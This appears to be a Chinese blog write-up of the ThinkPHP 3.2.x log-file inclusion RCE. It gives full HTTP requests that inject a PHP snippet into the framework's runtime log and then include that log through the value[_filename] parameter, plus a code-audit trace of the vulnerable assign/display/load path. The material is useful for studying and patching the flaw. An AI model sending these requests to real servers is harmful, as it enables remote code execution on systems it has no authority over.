# 原创
：  ThinkPHP3.2.x RCE

# ThinkPHP3.2.x RCE

#### ThinkPHP3.2.x RCE

## 初始配置

> 



```
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index($value=''){
        $this-&gt;assign($value);
        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;','utf-8');
    }
}

```

## 漏洞利用

> 
利用`burpsuite`进行抓包修改包避免编码问题造成漏洞无法利用


### debug模式开启

> 
先用`Thinkphp Getshell`工具检测一下漏洞是否存在


> 
请求数据包，查看日志文件`Application/Runtime/Logs/Home/21_08_02.log`发现成功写入


```
GET /cms/index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close

```

> 
构造攻击请求，成功触发该漏洞


```
GET /cms/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close

```

### debug模式未开启

> 
请求数据包


```
GET /cms/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close

```

> 
构造攻击请求，成功触发该漏洞


```
GET /cms/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close

```

### 文件包含\上传

> 
上传具有恶意代码的任何文件到服务器上，直接包含其文件相对或绝对路径即可


```
http://192.168.10.9/cms/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./phpinfo.php

```

## 漏洞分析

### 程序执行流程

### 漏洞利用原理

> 
在ThinkPHP3.2.3框架的程序中，如果要在模板中输出变量，需要在控制器中把变量传递给模板，系统提供了assign方法对模板变量赋值，本漏洞的利用条件为assign方法的第一个变量可控


### 本地代码审计

> 
先跟进`Application/Home/Controller/IndexController.class.php`，功能代码中的`assign`方法中第一个变量为可控变量


> 
全局搜索`assign`，跟进`ThinkPHP/Library/Think/View.class.php`，可控变量进入assign方法赋值给`$this→tVar`变量


> 
进入`show`方法，跟进`ThinkPHP/Library/Think/Controller.class.php`，发现进一步调用了`display`方法


> 
全局搜索`display`方法，跟进`ThinkPHP/Library/Think/View.class.php`，`display`方法开始解析并获取模板文件内容，此时模板文件路径和内容为空


> 
进入`fetch`方法，传入的参数为空时会根据配置获取默认的模板文件位置 `(./Application/Home/View/Index/index.html)`，之后系统配置的默认模板引擎为think，所以会进入else分支，获取`$this→tVar`变量值赋值给`$params`，之后进入`Hook::listen`方法


> 
进入`listen`方法，跟进`ThinkPHP/Library/Think/Hook.class.php`，进入`exec`方法


> 
进入`exec`方法中，处理后调用`Behavior\ParseTemplateBehavior`类中的`run`方法处理`$params`这个带有日志文件路径的值


> 
进入`run`方法，跟进`ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php`，进入else分支调用`Think\Template`类中的`fetch`方法对变量`$_data`进行处理


> 
跟进`ThinkPHP/Library/Think/Template.class.php`，获取缓存文件路径后进入Storage的`load`方法中


> 
跟进到`ThinkPHP/Library/Think/Storage/Driver/File.class.php`的`load`方法中，`$_filename`为之前获取的缓存文件路径，`$vars`则为之前带有_filename=日志文件路径的数组，`$vars`不为空则使用`extract`方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，导致文件包含，触发`ThinkPHP 3.x Log RCE`漏洞


## 漏洞通报

> 
[戳此查看漏洞通报](https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ)

